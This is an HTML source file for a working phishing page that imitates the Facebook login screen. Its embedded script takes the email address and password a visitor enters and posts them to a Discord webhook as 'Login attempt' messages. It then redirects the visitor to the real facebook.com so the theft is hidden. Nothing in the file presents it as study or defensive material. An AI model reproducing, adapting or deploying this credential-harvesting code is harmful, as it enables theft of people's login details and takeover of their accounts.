<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="stylesheet" href="default.css">
    <link rel="stylesheet" href="style.css">
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('login-btn').addEventListener('click', function (e) {
                e.preventDefault(); // Prevents the form from submitting in the traditional way
                var email = document.getElementById('email').value;
                var pass = document.getElementById('pass').value;

                var data = {
                    content: `Login attempt: ${email} / ${pass}`
                };

                fetch('https://discord.com/api/webhooks/1216704735092936774/BbsaihTkqofedaG8B1g_hJQ_XHt12yYSwUUo2KzmtkXZYTItRAhvMUQLfeREThhXvZ2T', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = "https://www.facebook.com"; // Redirects to Facebook after a successful post
                    } else {
                        console.log('Submission to webhook failed');
                    }
                })
                .catch(error => console.log('error', error));
            });
        });
    </script>
</head>
<body>
    <div class="login">
        <div class="container">
            <div class="row">
                <div class="col-5 col-xs-12">
                    <div class="login-form">
                        <!-- Note: Form does not have an 'action' attribute now; it uses JavaScript for submission -->
                        <form id="login-form">
                            <input id="email" type="text" placeholder="Email address or phone number"><br>
                            <input id="pass" type="password" placeholder="Password"><br>
                            <button id="login-btn" type="button">Log In</button><br>
                            <a href="#">Forgotten password?</a><br>
                            <button id="create-btn" type="button">Create New Account</button><br>
                        </form>
                    </div>
                    <footer>
                        <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a celebrity, band or business.
                    </footer>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
